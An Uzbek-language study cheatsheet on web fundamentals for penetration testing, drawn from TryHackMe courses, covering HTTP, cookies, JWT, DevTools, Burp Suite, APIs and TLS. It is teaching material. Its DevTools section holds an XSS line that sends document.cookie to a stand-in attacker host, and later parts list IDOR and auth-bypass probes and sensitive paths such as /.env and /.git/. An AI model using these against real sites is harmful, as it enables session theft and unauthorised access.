# 🌍 Web Fundamentals — Cheatsheet

> **Manba:** TryHackMe — Pre Security + Cyber Security 101  
> **Mavzular:** HTTP · HTML · Cookies · Sessions · DevTools · Burp Suite · APIs

---

## 1. Web qanday ishlaydi?

```
Siz URL kiritasiz: https://example.com/login
        ↓
1. DNS: example.com → 93.184.216.34
        ↓
2. TCP ulanish: 3-way handshake (port 443)
        ↓
3. TLS handshake (HTTPS uchun)
        ↓
4. HTTP Request yuboriladi:
   GET /login HTTP/1.1
   Host: example.com
        ↓
5. Server Response qaytaradi:
   HTTP/1.1 200 OK
   <html>...</html>
        ↓
6. Brauzer HTML, CSS, JS yuklab render qiladi
```

---

## 2. HTTP Request — To'liq tuzilish

```http
POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Authorization: Bearer eyJhbGci...
Cookie: session=abc123; theme=dark
User-Agent: Mozilla/5.0
Accept: application/json
Content-Length: 42

{"username": "admin", "password": "pass123"}
```

| Qism | Tavsif |
|------|--------|
| `POST` | HTTP metodi |
| `/api/login` | Endpoint (yo'l) |
| `HTTP/1.1` | Protokol versiyasi |
| `Host` | Sayt manzili |
| `Cookie` | Sessiya ma'lumotlari |
| `Authorization` | Token/credential |
| Body | Yuborilgan ma'lumotlar |

---

## 3. Cookies — Batafsil

### Cookie nima?
Server browser'ga bergan kichik ma'lumot — keyingi so'rovlarda browser uni serverga qaytaradi.

```http
# Server tomonidan beriladi:
Set-Cookie: session=xyz789; Path=/; HttpOnly; Secure; SameSite=Strict

# Keyingi so'rovda browser qaytaradi:
Cookie: session=xyz789
```

### Cookie Atributlari
| Atribut | Vazifa | Yo'q bo'lsa xavf |
|---------|--------|-----------------|
| `HttpOnly` | JS orqali o'qib bo'lmaydi | XSS bilan session o'g'irlash |
| `Secure` | Faqat HTTPS orqali | HTTP'da interception |
| `SameSite=Strict` | Boshqa saytdan yuborilmaydi | CSRF hujum |
| `Expires` | Muddati | Eskirgan session |
| `Path=/admin` | Faqat /admin'ga | — |
| `Domain` | Qaysi domenga | Subdomain sharing |

### DevTools bilan Cookie ko'rish
```
F12 → Application → Storage → Cookies → [sayt]
```

### curl bilan Cookie manipulyatsiya
```bash
# Cookie yuborish:
curl -b "session=abc123" http://site.com

# Cookie saqlash:
curl -c cookies.txt http://site.com/login

# Saqlangan cookie bilan so'rov:
curl -b cookies.txt http://site.com/dashboard
```

---

## 4. Sessions vs Cookies

```
Cookie (Client-side):
┌──────────────────┐
│ Browser          │  Cookie: session_id=abc123
│ ┌─────────────┐  │ ─────────────────────────→  Server
│ │session=abc  │  │                              Bazada: abc123 → {user: "admin"}
│ └─────────────┘  │ ←─────────────────────────
└──────────────────┘  Javob

JWT (Stateless):
┌──────────────────┐
│ Browser          │  Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx
│ ┌─────────────┐  │ ─────────────────────────→  Server
│ │ JWT token   │  │                              Bazasiz tekshiradi (signature)
│ └─────────────┘  │ ←─────────────────────────
└──────────────────┘  Javob
```

### JWT tuzilishi
```
eyJhbGciOiJIUzI1NiJ9  .  eyJ1c2VyIjoiYWRtaW4ifQ  .  SflKxwRJSMeKKF...
      HEADER                      PAYLOAD                  SIGNATURE
         ↓                           ↓
{"alg":"HS256","typ":"JWT"}   {"user":"admin","role":"user"}
```

```bash
# JWT decode (bash):
echo "eyJ1c2VyIjoiYWRtaW4ifQ" | base64 -d
# → {"user":"admin"}

# jwt.io saytida ham decode qilsa bo'ladi
```

---

## 5. DevTools — Web Pentest uchun

### Network Tab ⭐ (eng muhim)
```
F12 → Network → Sahifani yangilash (F5)

Nima ko'rish mumkin:
- Barcha HTTP so'rovlar va javoblar
- Request/Response headerlar
- Cookie'lar
- POST body ma'lumotlari
- Response vaqti va o'lchami
```

**Qanday ishlatamiz:**
1. F12 → Network
2. Saytga login qiling
3. Login so'rovini toping
4. "Headers" → "Request Headers" → Cookie, Authorization ko'ring
5. "Payload" → POST body ko'ring

### Console Tab
```javascript
// JavaScript injection:
document.cookie              // Cookie'larni o'qish
localStorage                 // LocalStorage
sessionStorage               // SessionStorage
document.location.href       // Hozirgi URL

// XSS test:
alert(document.cookie)
fetch('http://attacker.com/?c='+document.cookie)

// Base64:
atob("encoded")              // Decode
btoa("plain text")           // Encode
```

### Application Tab
```
F12 → Application:
├── Cookies       ← Cookie ko'rish/o'zgartirish ⭐
├── Local Storage ← Key-value storage
├── Session Storage
└── IndexedDB
```

### Sources Tab
```
F12 → Sources:
- JavaScript fayllarini ko'rish
- Breakpoint qo'yish (debugging)
- { } tugmasi → Pretty Print (minified kodni formatlash)
```

---

## 6. Burp Suite — Asosiy Ishlatish ⭐

Burp Suite — HTTP so'rovlarni ushlab, o'zgartirib, qayta yuborish imkonini beruvchi proksi.

### Sozlash
```
1. Burp Suite'ni ochamiz
2. Proxy → Options → 127.0.0.1:8080 (default)
3. Brauzer proxy'ni sozlaymiz:
   Firefox: Settings → Network → Manual Proxy → 127.0.0.1:8080
4. Burp CA sertifikatini o'rnatamiz (HTTPS uchun):
   http://burpsuite → CA sertifikat yuklab, brauzerga import
```

### Asosiy bo'limlar

**Proxy → Intercept:**
```
Intercept ON → Brauzerda so'rov yuboring → 
Burp ushlab qoladi → O'zgartirib → Forward
```

**Proxy → HTTP History:**
```
Barcha o'tgan so'rovlar — keyin ko'rish uchun ⭐
```

**Repeater (Ctrl+R):**
```
So'rovni bir necha bor turli parametrlar bilan yuborish
SQL injection, XSS test uchun ideal ⭐
```

**Intruder (Ctrl+I):**
```
Avtomatik payload yuborish:
- Brute force (login)
- Fuzzing (directory discovery)
- Parameter tampering
```

**Decoder:**
```
URL decode, Base64 decode/encode, HTML entities, hex
```

### Tez Workflow
```
1. Saytga kiring, so'rov yuboring
2. HTTP History'dan so'rovni toping
3. "Send to Repeater" (Ctrl+R)
4. Repeater'da payload'ni o'zgartirib sinang
5. Response'ni kuzating
```

---

## 7. APIs va REST

### REST API asoslari
```
GET    /api/users          → Barcha userlarni olish
GET    /api/users/5        → 5-user ma'lumoti
POST   /api/users          → Yangi user yaratish
PUT    /api/users/5        → 5-userni yangilash
DELETE /api/users/5        → 5-userni o'chirish
```

### API so'rovlari
```bash
# GET:
curl https://api.example.com/users
curl -H "Authorization: Bearer TOKEN" https://api.example.com/users

# POST (JSON):
curl -X POST https://api.example.com/users \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"name": "Ali", "email": "ali@test.com"}'

# Chiroyli JSON output:
curl https://api.example.com/users | python3 -m json.tool

# PUT:
curl -X PUT https://api.example.com/users/5 \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

# DELETE:
curl -X DELETE https://api.example.com/users/5 \
  -H "Authorization: Bearer TOKEN"
```

### API Zaifliklarini Tekshirish
```bash
# IDOR (Insecure Direct Object Reference):
# /api/users/5 → /api/users/1, /api/users/6, /api/users/100

# Authentication bypass:
# Token'siz so'rov yuborish
curl https://api.example.com/admin/users

# Method tampering:
# POST o'rniga GET yoki PUT bilan:
curl -X GET https://api.example.com/users/delete/5

# Hidden endpoints:
# /api/v1/, /api/v2/, /api/internal/, /api/debug/
```

---

## 8. HTTPS va TLS

```
HTTP  → Ma'lumot ochiq yuboriladi (MITM xavfi!)
HTTPS → TLS bilan shifrlangan

TLS Handshake:
Client                    Server
  |──── ClientHello ────→|    (Qo'llab-quvvatlanadigan sifar ro'yxati)
  |←─── ServerHello ─────|    (Tanlangan sifar + server sertifikati)
  |←─── Certificate ─────|    (Server haqiqiyligini isbotlash)
  |──── KeyExchange ────→|    (Sessiya kaliti kelishish)
  |══════ Encrypted ══════|   (Endi xavfsiz!)
```

### SSL/TLS zaifliklarni tekshirish
```bash
# SSL sertifikat ma'lumoti:
openssl s_client -connect example.com:443

# SSL zaifliklarni scan:
nmap --script ssl-enum-ciphers -p 443 example.com

# testssl.sh (maxsus tool):
./testssl.sh example.com
```

---

## ⚡ Tez Referans

```bash
# URL decode:
python3 -c "from urllib.parse import unquote; print(unquote('hello%20world'))"

# URL encode:
python3 -c "from urllib.parse import quote; print(quote('hello world'))"

# Base64:
echo "text" | base64          # Encode
echo "dGV4dA==" | base64 -d   # Decode

# HTML entities:
& → &amp;    < → &lt;    > → &gt;    " → &quot;

# Muhim URL'lar:
/robots.txt       ← Har doim tekshir
/sitemap.xml      ← Sahifalar ro'yxati
/.git/            ← Git leak
/admin            ← Admin panel
/api/             ← API endpoints
/.env             ← Environment variables
/backup/          ← Backup fayllar
/swagger/         ← API dokumentatsiya
/phpinfo.php      ← PHP info leak
```

---

*TryHackMe Pre Security + Cyber Security 101 | Web Fundamentals*
